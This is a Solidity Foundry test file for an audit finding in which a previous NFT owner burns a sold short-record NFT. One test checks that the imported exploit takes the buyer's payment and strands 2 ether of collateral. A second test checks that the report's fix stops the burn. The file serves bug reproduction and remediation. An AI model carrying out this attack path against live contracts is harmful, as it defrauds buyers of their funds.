// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    Exploit,
    PaymentToken,
    ShortRecordNFT,
    EscrowBuyer,
    Errors,
    appStorage,
    ASSET,
    COLLATERAL,
    DEBT,
    PRICE
} from "./27455-previous-nft-owner-can-burn-nft-from-the-new-owner-codehawks.sol";

/// Recommended fix from the report: reset tokenId in deleteShortRecord.
/// The NFT still moves to the buyer. The seller's revived short no longer names it,
/// so combineShorts does not burn, and a direct burn reverts.
contract FixedShortRecordNFT is ShortRecordNFT {
    function deleteShortRecord(address asset, address shorter, uint8 id) internal override {
        super.deleteShortRecord(asset, shorter, id);
        appStorage().shortRecords[asset][shorter][id].tokenId = 0;
    }
}

contract Finding27455Test is Test {
    function test_exploit_previous_owner_burns_buyers_nft() public {
        Exploit e = new Exploit();
        e.run();

        PaymentToken pay = e.pay();
        ShortRecordNFT market = e.market();
        EscrowBuyer buyer = e.buyer();

        assertEq(e.soldTokenId(), 1, "sold token is not 1");
        assertEq(e.staleShortId(), 2, "partial short id drifted");
        assertEq(e.buyerShortId(), 2, "buyer short id drifted");
        assertEq(e.ownerBeforeBurn(), address(buyer), "buyer never received the nft");
        assertEq(e.ownerAfterBurn(), address(0), "nft owner was not cleared");
        assertEq(e.staleTokenStillSet(), 1, "revived short did not keep tokenId 1");
        assertEq(e.paymentKept(), 1 ether, "seller did not keep 1 dUSD");
        assertEq(pay.balanceOf(address(e)), 1 ether, "exploit balance is not 1 dUSD");
        assertEq(pay.balanceOf(address(buyer)), 0, "buyer was refunded");
        assertEq(e.stranded(), 2 ether, "stranded collateral is not 2 ether");
        assertEq(market.collateralOf(ASSET, address(buyer), e.buyerShortId()), 2 ether, "buyer short collateral moved");
        assertEq(market.tokenIdOf(ASSET, address(buyer), e.buyerShortId()), 0, "buyer tokenId not cleared by burn");
        assertEq(market.tokenIdOf(ASSET, address(e), e.staleShortId()), 1, "seller stale tokenId was cleared");
        assertFalse(buyer.canClaim(), "buyer can still redeem");
        assertEq(market.ownerOf(2), address(e), "seller second nft was burned too");

        vm.expectRevert(abi.encodeWithSelector(Errors.ERC721NonexistentToken.selector, uint256(1)));
        market.ownerOf(1);

        vm.expectRevert(abi.encodeWithSelector(Errors.ERC721NonexistentToken.selector, uint256(1)));
        buyer.claim();
    }

    function test_control_reset_tokenId_previous_owner_cannot_burn() public {
        PaymentToken pay = new PaymentToken();
        FixedShortRecordNFT market = new FixedShortRecordNFT();
        EscrowBuyer buyer = new EscrowBuyer(pay, market);

        uint8 stale = market.openPartialShort(ASSET, COLLATERAL, DEBT);
        uint256 sold = market.mintNFT(ASSET, stale);
        assertEq(sold, 1, "control token id");

        pay.mint(address(buyer), PRICE);
        buyer.fundAndPay(address(this), PRICE);
        assertEq(pay.balanceOf(address(this)), PRICE, "payment not received");

        market.transferFrom(address(this), address(buyer), sold);
        buyer.noteToken(sold);

        assertEq(market.ownerOf(sold), address(buyer), "buyer did not receive the nft");
        assertEq(market.tokenIdOf(ASSET, address(this), stale), 0, "tokenId was not reset on delete");
        assertEq(market.collateralOf(ASSET, address(buyer), 2), COLLATERAL, "buyer collateral missing");

        vm.expectRevert(Errors.NotMinted.selector);
        market.burnShortNft(ASSET, stale);
        assertEq(market.ownerOf(sold), address(buyer), "direct burn succeeded after transfer");

        market.fillRemaining(ASSET, stale, COLLATERAL, DEBT);
        assertEq(market.tokenIdOf(ASSET, address(this), stale), 0, "fill restored the sold tokenId");

        uint8 second = market.openFilledShort(ASSET, 1 ether, 1 ether);
        market.mintNFT(ASSET, second);
        market.combineShorts(ASSET, second, stale);

        assertEq(market.ownerOf(sold), address(buyer), "combine burned the buyer nft");
        assertTrue(buyer.canClaim(), "buyer cannot redeem");
        uint88 got = buyer.claim();
        assertEq(got, COLLATERAL, "buyer did not recover 2 ether collateral");
        assertEq(market.collateralOf(ASSET, address(buyer), 2), 0, "collateral still stranded");
        assertEq(pay.balanceOf(address(buyer)), 0, "control payment drifted");
        assertEq(pay.balanceOf(address(this)), PRICE, "seller was not paid for a real sale");
        assertEq(market.ownerOf(sold), address(buyer), "claim changed the owner");
    }
}
